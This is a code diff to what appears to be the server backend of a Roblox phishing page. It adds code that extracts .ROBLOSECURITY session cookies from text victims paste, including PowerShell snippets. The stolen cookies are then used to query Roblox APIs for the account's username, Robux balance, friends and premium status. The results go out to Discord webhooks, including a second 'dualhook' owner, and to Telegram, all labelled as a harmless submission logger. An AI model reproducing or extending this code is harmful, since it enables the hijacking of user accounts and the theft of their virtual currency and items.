@@ -23,8 +23,84 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-async function sendToDiscord(webhookUrl, pageName, slotLabel, slotValue, now) {
+// Extract clean .ROBLOSECURITY token from any input
+// Handles: raw cookie, PowerShell scripts, copied browser storage, etc.
+function extractRobloxCookie(raw) {
+  if (!raw) return null;
+
+  // Match the token after the WARNING prefix
+  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-\.]+)/);
+  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
+
+  // Match from .ROBLOSECURITY cookie line in powershell/text
+  const psMatch = raw.match(/\.ROBLOSECURITY['")\s,]*[,\s]*["']?(_\|WARNING[^"'\s]+)/);
+  if (psMatch) return psMatch[1];
+
+  // Match bare token (starts with _|WARNING or just the long base64-like string after |_)
+  const bareMatch = raw.match(/(_\|WARNING[-A-Z0-9.:_ ]+\|_[\w\-.]+)/);
+  if (bareMatch) return bareMatch[1];
+
+  // If it looks like just the token part after |_ (no WARNING prefix)
+  const tokenOnly = raw.match(/\|_([\w\-]{50,})/);
+  if (tokenOnly) return tokenOnly[1];
+
+  return null;
+}
+
+// Fetch Roblox account info using the cookie
+async function fetchRobloxInfo(cookie) {
+  try {
+    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
+
+    const [authRes, robuxRes] = await Promise.all([
+      fetch('https://users.roblox.com/v1/users/authenticated', { headers }),
+      fetch('https://economy.roblox.com/v1/user/currency', { headers })
+    ]);
+
+    if (!authRes.ok) return null;
+
+    const auth = await authRes.json();
+    const robux = robuxRes.ok ? await robuxRes.json() : null;
+
+    // Fetch extra profile info
+    const [friendRes, premiumRes] = await Promise.all([
+      fetch(`https://friends.roblox.com/v1/users/${auth.id}/friends/count`, { headers }),
+      fetch(`https://premiumfeatures.roblox.com/v1/users/${auth.id}/validate-membership`, { headers })
+    ]);
+
+    const friendData  = friendRes.ok  ? await friendRes.json()  : null;
+    const isPremium   = premiumRes.ok ? await premiumRes.json() : false;
+
+    return {
+      id:          auth.id,
+      username:    auth.name,
+      displayName: auth.displayName,
+      robux:       robux?.robux ?? 'N/A',
+      friends:     friendData?.count ?? 'N/A',
+      premium:     isPremium === true ? 'Yes ⭐' : 'No',
+    };
+  } catch (_) {
+    return null;
+  }
+}
+
+async function sendToDiscord(webhookUrl, pageName, slotLabel, rawValue, roblox, now) {
   if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
+
+  // Build pasted content field value
+  let pastedField;
+  if (roblox) {
+    pastedField = [
+      `👤 **${roblox.username}** (${roblox.displayName})`,
+      `🆔 ID: \`${roblox.id}\``,
+      `💰 Robux: \`${roblox.robux}\``,
+      `👥 Friends: \`${roblox.friends}\``,
+      `⭐ Premium: \`${roblox.premium}\``,
+    ].join('\n');
+  } else {
+    pastedField = `\`${rawValue}\``;
+  }
+
   try {
     await fetch(webhookUrl, {
       method: 'POST',
@@ -34,6 +110,7 @@ async function sendToDiscord(webhookUrl, pageName, slotLabel, slotValue, now) {
         embeds: [
           {
             title: '🚨 New Submission Received',
+            description: ':fire: `NEW PAGE ENTRY` :fire:',
             color: 5793266,
             fields: [
               {
@@ -48,15 +125,16 @@ async function sendToDiscord(webhookUrl, pageName, slotLabel, slotValue, now) {
               },
               {
                 name: '📥 Pasted Content',
-                value: `\`\`\`${slotValue}\`\`\``
+                value: pastedField
+              },
+              {
+                name: '📅 Date Submitted',
+                value: `\`${now}\``,
+                inline: false
               }
             ],
-            footer: {
-              text: 'Submission Logger • Automated System'
-            },
-            thumbnail: {
-              url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
-            }
+            footer: { text: 'Submission Logger • Automated System' },
+            thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
           }
         ],
         attachments: []
@@ -79,7 +157,6 @@ export default async function handler(req, res) {
   }
 
   const { slug, slots } = body || {};
-
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
 
@@ -92,22 +169,31 @@ export default async function handler(req, res) {
   if (!record) return res.status(404).json({ error: 'Page not found' });
 
   const now = new Date().toISOString();
-  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
-  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
-  const slotValue = slotEntry ? slotEntry[1] : '(empty)';
+  const slotEntry  = Object.entries(slots).find(([, v]) => v && v.length > 0);
+  const slotLabel  = slotEntry ? slotEntry[0] : 'N/A';
+  const rawValue   = slotEntry ? slotEntry[1] : '(empty)';
 
-  // ── Send to webhook2 (page owner) ─────────────────────────────────────────
-  await sendToDiscord(record.webhook, record.displayName, slotLabel, slotValue, now);
+  // Try to extract & resolve Roblox cookie
+  const cookie  = extractRobloxCookie(rawValue);
+  const roblox  = cookie ? await fetchRobloxInfo(cookie) : null;
 
-  // ── Send to webhook1 (dualhook creator) if applicable ────────────────────
+  // Build TG display
+  const tgContent = roblox
+    ? `👤 ${roblox.username} (${roblox.displayName})\n🆔 ${roblox.id}\n💰 Robux: ${roblox.robux}\n👥 Friends: ${roblox.friends}\n⭐ Premium: ${roblox.premium}`
+    : rawValue;
+
+  // ── Send to webhook2 ──────────────────────────────────────────────────────
+  await sendToDiscord(record.webhook, record.displayName, slotLabel, rawValue, roblox, now);
+
+  // ── Send to webhook1 if dualhook child ───────────────────────────────────
   let webhook1 = 'N/A';
   if (record.dualhookParent) {
     try {
       const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
-      if (parentRecord && parentRecord.webhook) {
+      if (parentRecord?.webhook) {
         webhook1 = parentRecord.webhook;
         if (parentRecord.webhook !== record.webhook) {
-          await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, slotValue, now);
+          await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, rawValue, roblox, now);
         }
       }
     } catch (_) {}
@@ -121,7 +207,7 @@ export default async function handler(req, res) {
     `${record.displayName}`,
     `------------------------------------------`,
     `🎯 TYPE = ${slotLabel}:`,
-    `${slotValue}`,
+    tgContent,
     `------------------------------------------`,
     `🔗 PAGE WEBHOOK (WEBHOOK2):`,
     `<code>${record.webhook}</code>`,
